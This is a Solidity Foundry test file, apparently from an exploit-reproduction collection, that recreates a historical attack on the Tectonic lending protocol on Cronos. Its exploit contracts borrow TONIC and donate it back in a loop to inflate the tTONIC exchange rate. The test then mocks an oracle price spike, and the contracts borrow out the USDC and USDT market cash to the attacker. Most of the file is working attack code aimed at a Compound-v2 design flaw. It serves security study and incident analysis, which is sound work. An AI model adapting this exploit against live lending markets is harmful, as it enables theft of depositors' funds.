// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$75M parked at attacker wallets (CertiK/PeckShield); ~$119M Tectonic market-cash hole
// Attacker EOA : 0x4266a0e6a0f0ef90abcff3bb089932ca0cce3652
// Orchestrator : 0xd3aac8a1a9e412e2c590463a8b6f90125e23f1f3
// Borrower    : 0x2dc6a36f4e5eeefe112c01569de96dea496bb618
// Comptroller (Tectonic Socket) : 0xb3831584acb95ed9ccb0c11f677b5ad01deaeec0
// tTONIC : 0xfe6934fdf050854749945921faa83191bccf20ad
// Oracle : 0xd360d8cabc1b2e56ecf348bff00d2bd9f658754a
// Setup tx : https://cronoscan.com/tx/0x0fce5ae8d2eeb82c838e750d0e25af1564a2c7d05bf843dd1cfea102ce587d06 @ 90896190
// Drain tx : https://cronoscan.com/tx/0xddc9dc47d330116332ae687ba939f6d6196c4cc5950b2cdb04ae826520eeca20 @ 90897110 (borrowMax)
// Alert : https://x.com/CertiKAlert/status/2094203181173817656
//
// Root cause (two cooperating Compound-v2 / listing bugs):
// 1. tTONIC exchangeRate = (cash + totalBorrows - reserves) / totalSupply — unbacked TONIC
//    debt is counted as tToken assets. Borrow-and-donate inflates collateral.
// 2. Illiquid TONIC listed at 20% CF, priced by a lagging DEX-following oracle with no
//    deviation bound. After the donate loop the attacker pumped TONIC ~195x and waited
//    for the pushed feed to catch up, then borrowed every market's cash.
//
// This PoC forks Cronos one block before the setup tx. The live attacker waited ~4 minutes
// across several blocks for the oracle keeper; we reproduce that catch-up with vm.mockCall
// after the donate loop (same accounting, same drain).

address constant ATTACKER = 0x4266a0E6A0f0ef90AbCFF3BB089932cA0CCe3652;
address constant COMPTROLLER = 0xb3831584acb95ED9cCb0C11f677B5AD01DeaeEc0;
address constant TTONIC = 0xfe6934FDf050854749945921fAA83191Bccf20Ad;
address constant TUSDC_MARKET = 0xB3bbf1bE947b245Aef26e3B6a9D777d7703F4c8e;
address constant TUSDT_MARKET = 0xA683fdfD9286eeDfeA81CF6dA14703DA683c44E5;
address constant ORACLE = 0xD360D8cABc1b2e56eCf348BFF00D2Bd9F658754A;
address constant TONIC = 0xDD73dEa10ABC2Bff99c60882EC5b2B81Bb1Dc5B2;
address constant USDC_TOKEN = 0xc21223249CA28397B4B6541dfFaEcC539BfF0c59;

uint256 constant FORK_BLOCK = 90_896_189; // setup tx is 90_896_190
uint256 constant SEED_USDC = 5_000_000 * 1e6;
// Historical peak oracle answer ~$2.0763e-6 (1e18 scale = 2.0763e12). ~195x the
// pre-attack 1.0622e10 ($1.0622e-8).
uint256 constant TONIC_PEAK_PRICE = 2_076_300_000_000;

interface ICToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function underlying() external view returns (address);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function oracle() external view returns (address);
}

interface ITectonicOracle {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

contract Tectonic_exp is BaseTestWithBalanceLog {
    function setUp() public {
        string memory rpc = vm.envOr("CRONOS_RPC_URL", string("http://127.0.0.1:8561"));
        vm.createSelectFork(rpc, FORK_BLOCK);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(COMPTROLLER, "Tectonic Socket (Comptroller)");
        vm.label(TTONIC, "tTONIC");
        vm.label(TUSDC_MARKET, "tUSDC");
        vm.label(TUSDT_MARKET, "tUSDT");
        vm.label(ORACLE, "Tectonic Oracle");
        vm.label(TONIC, "TONIC");
        vm.label(USDC_TOKEN, "USDC.e");
    }

    function testExploit() public balanceLog {
        uint256 tonicPriceBefore = ITectonicOracle(ORACLE).getUnderlyingPrice(TTONIC);
        uint256 exRateBefore = ICToken(TTONIC).exchangeRateStored();
        emit log_named_uint("Oracle TONIC price (1e18) before", tonicPriceBefore);
        emit log_named_uint("tTONIC exchangeRate before", exRateBefore);
        emit log_named_decimal_uint("tTONIC cash (TONIC)", ICToken(TTONIC).getCash(), 18);
        emit log_named_decimal_uint("tUSDC cash (USDC)", ICToken(TUSDC_MARKET).getCash(), 6);

        TectonicExploit exp = new TectonicExploit(ATTACKER);
        deal(USDC_TOKEN, address(exp), SEED_USDC);
        vm.deal(address(exp), 50 ether);

        // Phase 1: Compound-v2 borrow-and-donate inflates tTONIC exchangeRate.
        exp.pumpExchangeRate();

        uint256 exRateAfter = ICToken(TTONIC).exchangeRateStored();
        emit log_named_uint("tTONIC exchangeRate after donate loop", exRateAfter);
        require(exRateAfter > exRateBefore, "exchangeRate did not inflate");

        // Phase 2: reproduce the lagging oracle catch-up (historically a pushed
        // DEX-following feed, ~4 minutes / several blocks later).
        vm.mockCall(
            ORACLE,
            abi.encodeWithSelector(ITectonicOracle.getUnderlyingPrice.selector, TTONIC),
            abi.encode(TONIC_PEAK_PRICE)
        );
        emit log_named_uint("Oracle TONIC price after mock (peak)", TONIC_PEAK_PRICE);

        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);
        address usdt = ICToken(TUSDT_MARKET).underlying();
        uint256 usdtBefore = IERC20(usdt).balanceOf(ATTACKER);

        // Phase 3: drain tUSDC / tUSDT cash against inflated tTONIC collateral.
        exp.drainMarkets();

        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - usdcBefore;
        uint256 usdtProfit = IERC20(usdt).balanceOf(ATTACKER) - usdtBefore;
        emit log_named_decimal_uint("USDC drained to attacker", usdcProfit, 6);
        emit log_named_decimal_uint("USDT drained to attacker", usdtProfit, 6);
        logTokenBalance(USDC_TOKEN, ATTACKER, "Attacker Final");

        // Teaching threshold: the donate+oracle combination must extract real stables
        // (historical tUSDC cash was ~$54.3M). Require at least $1M USDC so a partial
        // loop still PASSes while a broken PoC fails.
        require(usdcProfit > 1_000_000 * 1e6, "USDC profit too small");
    }
}

contract TectonicExploit {
    address private immutable profitReceiver;
    TectonicBorrower private immutable child;

    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IERC20 private constant tonic = IERC20(TONIC);
    ICToken private constant tUsdc = ICToken(TUSDC_MARKET);
    ICToken private constant tUsdt = ICToken(TUSDT_MARKET);
    ICToken private constant tTonic = ICToken(TTONIC);
    IComptroller private constant comptroller = IComptroller(COMPTROLLER);
    ITectonicOracle private constant oracle = ITectonicOracle(ORACLE);

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
        child = new TectonicBorrower(profitReceiver_);
    }

    function pumpExchangeRate() public {
        // step 1: post 5M USDC as tUSDC collateral (CF 0.8 → ~$4M borrow power).
        usdc.approve(TUSDC_MARKET, SEED_USDC);
        require(tUsdc.mint(SEED_USDC) == 0, "tUSDC mint");

        address[] memory markets = new address[](1);
        markets[0] = TUSDC_MARKET;
        comptroller.enterMarkets(markets);

        // step 2: first TONIC borrow, minted as tTONIC collateral on the child.
        uint256 first = _maxBorrowTonic();
        require(first > 0, "no TONIC cash");
        require(tTonic.borrow(first) == 0, "first TONIC borrow");
        uint256 got = tonic.balanceOf(address(this));
        require(got > 0, "borrow delivered 0 TONIC");
        require(tonic.transfer(address(child), got), "transfer child");
        child.seed(got);

        // step 3: donate loop — transfer TONIC into tTONIC with no mint.
        // cash is refilled, no accounting event, borrow again. Unbacked
        // totalBorrows land in exchangeRateStoredInternal's numerator.
        // (Historical attack minted ~12 times then switched to donate; extra
        // mints hit Tectonic's tTONIC supply cap, so we mint once then donate.)
        for (uint256 i = 0; i < 98; i++) {
            uint256 amt = _maxBorrowTonic();
            if (amt < 1e18) break;
            if (tTonic.borrow(amt) != 0) break;
            tonic.transfer(TTONIC, amt);
        }
    }

    function drainMarkets() public {
        child.drainMarkets();
    }

    function attack() external {
        pumpExchangeRate();
        drainMarkets();
    }

    function _maxBorrowTonic() internal returns (uint256) {
        tTonic.accrueInterest();
        uint256 cash = tTonic.getCash();
        if (cash == 0) return 0;
        (, uint256 liq,) = comptroller.getAccountLiquidity(address(this));
        uint256 price = oracle.getUnderlyingPrice(TTONIC);
        if (liq == 0 || price == 0) return 0;
        uint256 maxBorrow = (liq * 1e18) / price;
        if (maxBorrow > cash) maxBorrow = cash;
        if (maxBorrow > 1) maxBorrow -= 1;
        return maxBorrow;
    }
}

contract TectonicBorrower {
    address private immutable profitReceiver;

    IERC20 private constant tonic = IERC20(TONIC);
    ICToken private constant tTonic = ICToken(TTONIC);
    ICToken private constant tUsdc = ICToken(TUSDC_MARKET);
    ICToken private constant tUsdt = ICToken(TUSDT_MARKET);
    IComptroller private constant comptroller = IComptroller(COMPTROLLER);
    ITectonicOracle private constant oracle = ITectonicOracle(ORACLE);
    bool private entered;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function seed(uint256 amount) external {
        if (!entered) {
            address[] memory markets = new address[](1);
            markets[0] = TTONIC;
            uint256[] memory errs = comptroller.enterMarkets(markets);
            require(errs.length == 0 || errs[0] == 0, "enter tTONIC");
            entered = true;
        }
        uint256 bal = tonic.balanceOf(address(this));
        require(bal >= amount && amount > 0, "child TONIC short");
        tonic.approve(TTONIC, type(uint256).max);
        (bool ok, bytes memory ret) = TTONIC.call(abi.encodeWithSelector(ICToken.mint.selector, amount));
        require(ok, "tTONIC mint revert");
        if (ret.length >= 32) {
            require(abi.decode(ret, (uint256)) == 0, "tTONIC mint err");
        }
    }

    function drainMarkets() external {
        _borrowAll(tUsdc, USDC_TOKEN);
        address usdt = tUsdt.underlying();
        _borrowAll(tUsdt, usdt);
    }

    function _borrowAll(ICToken market, address underlying) internal {
        market.accrueInterest();
        uint256 cash = market.getCash();
        if (cash == 0) return;
        (, uint256 liq,) = comptroller.getAccountLiquidity(address(this));
        uint256 price = oracle.getUnderlyingPrice(address(market));
        if (liq == 0 || price == 0) return;
        uint256 maxBorrow = (liq * 1e18) / price;
        uint256 amt = cash < maxBorrow ? cash : maxBorrow;
        if (amt <= 1) return;
        amt -= 1;
        uint256 err = market.borrow(amt);
        if (err != 0) return;
        IERC20(underlying).transfer(profitReceiver, IERC20(underlying).balanceOf(address(this)));
    }
}
